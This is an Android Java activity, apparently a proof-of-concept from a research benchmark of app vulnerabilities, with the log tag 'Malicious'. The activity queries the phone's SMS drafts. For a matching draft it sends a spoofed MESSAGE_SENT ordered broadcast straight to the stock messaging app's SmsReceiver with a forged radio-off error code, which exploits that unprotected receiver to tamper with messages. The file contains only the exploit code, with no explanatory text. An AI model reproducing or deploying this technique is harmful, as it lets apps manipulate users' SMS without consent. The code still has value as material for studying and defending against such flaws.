package edu.ksu.cs.benign;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume(){
        super.onResume();

        /*Intent intent1 = new Intent("android.intent.action.SENDTO");
        intent1.setData(Uri.parse("smsto:5554"));
        intent1.putExtra("sms_body", "another test sms1!");
        startActivity(intent1);*/

        int flag = 0;
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/draft"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String body = cursor.getString(cursor.getColumnIndex("body"));
                if(body.equals("another test sms1!")){
                    flag = 1;
                    Log.d(TAG, body);
                    Log.d(TAG, "id = " + cursor.getString(cursor.getColumnIndex("_ID")));
                    Log.d(TAG, "id = " + Uri.parse("content://sms/draft/" + cursor.getString(cursor.getColumnIndex("_ID"))));
                    Intent intent= new Intent("com.android.mms.transaction.MESSAGE_SENT");
                    intent.setData(Uri.parse("content://sms/draft/" + cursor.getString(cursor.getColumnIndex("_ID"))));
                    intent.setClassName("com.android.mms", "com.android.mms.transaction.SmsReceiver");
                    sendOrderedBroadcast(intent,null,null,null, SmsManager.RESULT_ERROR_RADIO_OFF,null,null);
                }
                else Log.d(TAG,"body not found");
                // use msgData
            } while (cursor.moveToNext());
        } else {
            Toast.makeText(getApplicationContext(),"Empty box",Toast.LENGTH_SHORT).show();
        }

        /*if(flag == 0){
            Intent intent1 = new Intent("android.intent.action.SENDTO");
            intent1.setData(Uri.parse("smsto:5554"));
            intent1.putExtra("sms_body", "another test sms1!");
            startActivity(intent1);
        }*/
    }
}
